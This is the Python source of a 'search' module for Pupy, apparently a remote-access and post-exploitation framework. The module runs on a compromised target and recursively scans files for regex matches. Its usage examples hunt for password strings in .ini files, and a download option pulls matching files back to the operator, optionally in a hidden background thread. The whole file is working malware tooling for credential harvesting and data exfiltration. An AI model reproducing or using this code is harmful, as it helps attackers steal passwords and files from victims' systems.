# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
import threading
from pupylib.utils.term import colorize
from rpyc.utils.classic import download

__class_name__="SearchModule"

@config(cat="gather")
class SearchModule(PupyModule):
    """walk through a directory and recursively search a string in file names or into files """
    
    unique_instance = True
    
    terminate = threading.Event()
    
    dependencies = [ 'pupyutils.search', 'scandir' ]

    def init_argparse(self):
        example = 'Examples:\n'
        example += '- Recursively search strings in files:\n'
        example += '>> run search .*ini passw.*=.*\n'
        example += '>> run search .* passw.*=.* -I\n'
        example += '- Recursively search string in file names:\n'
        example += '>> run search pwdfile.*\n'
        example += '- Recursively search strings in files in the background from "C:\\":\n'
        example += '>> run search ".*ini" "passw.*=.*" -p "C:\\\\" -B -s /tmp/out.txt\n'
        example += '- Check if a Search thread is running in the background:\n'
        example += '>> run search "" "" -a\n'
        example += '- Stop the Search thread which is running in the backgroud:\n'
        example += '>> run search ".*ini" "passw.*=.*" -B -s /tmp/out.txt -S\n'

        self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__, epilog=example)
        self.arg_parser.add_argument('-p', '--path', default='.', help='root path to start (default: current path)')
        self.arg_parser.add_argument('-m','--max-size', type=int, default=20000000, help='max file size (default 20 Mo)')
        self.arg_parser.add_argument('-b', '--binary', action='store_true', help='search content inside binary files')
        self.arg_parser.add_argument('-L', '--links', action='store_true', help='follow symlinks')
        self.arg_parser.add_argument('-D', '--download', action='store_true', help='download found files (imply -N)')
        self.arg_parser.add_argument('-N', '--no-content', action='store_true', help='if string matches, output just filename')
        self.arg_parser.add_argument('-I', '--insensitive', action='store_true', default=False, help='no case sensitive')
        self.arg_parser.add_argument('-s', '--save', type=str, default="", help='save results in this local file')
        self.arg_parser.add_argument('-B', '--background', action='store_true', help='run in the background')
        self.arg_parser.add_argument('-a', '--alive-background', action='store_true', help='a thread is already running in the backgroud?')
        self.arg_parser.add_argument('-S', '--stop-background', action='store_true', help='stop the background process')
        self.arg_parser.add_argument('filename', type=str, metavar='filename', help='regex to search (filename)')
        self.arg_parser.add_argument('strings', nargs='*', default=[], type=str, metavar='string', help='regex to search (content)')

    def run(self, args):
        if args.alive_background == True:
            alive = self.client.conn.modules['pupyutils.search'].getSearchThreadStatus()
            if alive == True:
                self.success("There is a Search thread which is running on the target.")
                self.success("You can stop this background process with --stop-background option")
            else:
                self.success("There is NOT a Search thread which is running on the target")
            return
        if args.stop_background == True:
            self.info("Trying to stop the Search module which should be running on the target...")
            status = self.client.conn.modules['pupyutils.search'].stopSearchThread()
            if status == True:
                self.success("A Search process was running in the backgroud, process stopped now")
            else:
                self.error("A Search process was NOT running in the backgroud, nothing to do")
            return

        fdesc = None
        if args.save != "" : 
            fdesc = open(args.save, "w")
            self.info("Results will be saved in {0}".format(args.save))

        if args.download:
            args.no_content = True
            
        if args.background == True:
            if args.save == "":
                self.error("--save option should be used with --background option")
                return
            else:
                self.info("Creating Search module in the backgroud...")
        
        s = self.client.conn.modules['pupyutils.search'].Search(
                args.filename,
                strings=args.strings,
                max_size=args.max_size,
                root_path=args.path,
                follow_symlinks=args.links,
                no_content=args.no_content,
                case=args.insensitive,
                binary=args.binary,
        )
            
        download_folder = None
        ros = None

        if args.download:
            config = self.client.pupsrv.config or PupyConfig()
            download_folder = config.get_folder('searches', {'%c': self.client.short_name()})
            ros = self.client.conn.modules['os']

        def on_data(res):
            if self.terminate.is_set():
                return

            if args.strings and not args.no_content:
                if type(res) == tuple:
                    msg = '{}: {}'.format(*res)
                    if args.save != "" : 
                        fdesc.write(msg+'\n')
                    elif args.background == False:
                         self.success(msg)
            else:
                if args.download and download is not None and ros is not None:
                    dest = res.replace('!', '!!').replace('/', '!').replace('\\', '!')
                    dest = os.path.join(download_folder, dest)
                    try:
                        size = ros.path.getsize(res)
                        download(
                            self.client.conn,
                            res,
                            dest,
                            chunk_size=min(size, 8*1024*1024))
                        msg = '{} -> {} ({})'.format(res, dest, size)
                        if args.save != "" : 
                            fdesc.write(msg+'\n')
                        elif args.background == False:
                            self.success(msg)
                    except Exception, e:
                        self.error('{} -> {}: {}'.format(res, dest, e))
                else:
                    msg = '{}'.format(res)
                    if args.save != "" : fdesc.write(msg+'\n')
                    elif args.background == False:
                        self.success(msg)

        def on_completed():
            self.terminate.set()
            if args.save != "":
                self.info("Search module finished: see {0} for results".format(args.save))
            else:
                self.info("Search module finished")

        if args.background == True:
            self.success("Notice there is not standard output when this option is enabled")
            status = s.run_cb(on_data, on_completed, daemon=True)
            if status == True:
                self.success("Search module is running in the background")
            else:
                self.error("Search module NOT created. Probably another thread is already running on the target.")
        else:
            status = s.run_cb(on_data, on_completed, daemon=False)
            if status == True:
                self.success("Search module is running on the target")
            else:
                self.error("Search module NOT created. Probably another thread is already running on the target.")
            self.info("Search started. Use ^C to interrupt")
            self.terminate.wait()
            self.client.conn.modules['pupyutils.search'].stopSearchThread()
            self.info("Search process stopped")
            if args.save != "": 
                fdesc.close()

    def interrupt(self):
        if self.terminate:
            self.terminate.set()

